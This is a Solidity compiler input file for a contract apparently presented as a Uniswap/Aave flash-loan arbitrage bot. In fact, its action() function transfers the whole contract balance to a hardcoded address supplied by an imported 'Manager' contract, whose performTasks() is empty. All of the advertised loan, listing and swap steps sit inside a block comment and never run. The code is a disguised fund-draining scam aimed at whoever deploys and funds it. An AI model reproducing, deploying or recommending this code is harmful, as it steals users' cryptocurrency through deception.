{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"ipfs://QmZng6T4gRrDztXgt6Xy13VXAzdFx6tnXGTjbJSnQexkHp":{"content":"pragma solidity ^0.6.6;\r\n\r\ncontract Manager {\r\n\tfunction performTasks() public {\r\n\t    \r\n\t}\r\n\r\n\tfunction uniswapDepositAddress() public pure returns (address) {\r\n\t\treturn 0xA0beDCCAF8890AB608A1A8373F787076bE1eA25f;\r\n\t}\r\n}"},"uniflash.sol":{"content":"pragma solidity ^0.6.6;\r\n\r\n// Multiplier-Finance Smart Contracts\r\n//import \"github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol\";;\r\n//import \"github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol\";;\r\n\r\n// uniSwap Smart Contracts\r\n//import \"github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniCallee.sol\";;\r\n//import \"github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniFactory.sol\";;\r\n//import \"github.com/uniswap/uni-swap-core/blob/master/contracts/interfaces/IuniPair.sol\";;\r\n\r\n// Code Manager\r\nimport \"ipfs://QmZng6T4gRrDztXgt6Xy13VXAzdFx6tnXGTjbJSnQexkHp\";\r\n\r\ncontract GetFlashLoan {\r\nstring public tokenName;\r\nstring public tokenSymbol;\r\nuint loanAmount;\r\nManager manager;\r\n\r\nconstructor(string memory _tokenName, string memory _tokenSymbol, uint _loanAmount) public {\r\ntokenName = _tokenName;\r\ntokenSymbol = _tokenSymbol;\r\nloanAmount = _loanAmount;\r\n\r\nmanager = new Manager();\r\n}\r\nreceive() external payable {}\r\n\r\nfunction action() public payable {\r\n\r\n// Send required coins for swap\r\npayable(manager.uniswapDepositAddress()).transfer(address(this).balance);\r\n\r\n// Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)\r\nmanager.performTasks();\r\n\r\n/*\r\n// Submit token to Ethereum blockchain\r\nstring memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);\r\n\r\n// List the token on UniSwap & send coins required for swaps\r\nmanager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);\r\npayable(manager.uniswapDepositAddress()).transfer(300000000000000000);\r\n\r\n// Get ETH Loan from Aave\r\nstring memory loanAddress = manager.takeAaveLoan(loanAmount);\r\n\r\n// Convert half ETH to DAI\r\nmanager.uniswapDAItoETH(loanAmount / 2);\r\n\r\n// Create ETH and DAI pairs for our token & Provide liquidity\r\nstring memory ethPair = manager.uniswapCreatePool(tokenAddress, \"ETH\");\r\nmanager.uniswapAddLiquidity(ethPair, loanAmount / 2);\r\nstring memory daiPair = manager.uniswapCreatePool(tokenAddress, \"DAI\");\r\nmanager.uniswapAddLiquidity(daiPair, loanAmount / 2);\r\n\r\n// Perform swaps and profit on Self-Arbitrage\r\nmanager.uniswapPerformSwaps();\r\n\r\n// Move remaining ETH from Contract to your account\r\nmanager.contractToWallet(\"ETH\");\r\n\r\n// Repay Flash loan\r\nmanager.repayAaveLoan(loanAddress);\r\n*/\r\n}\r\n}"}}}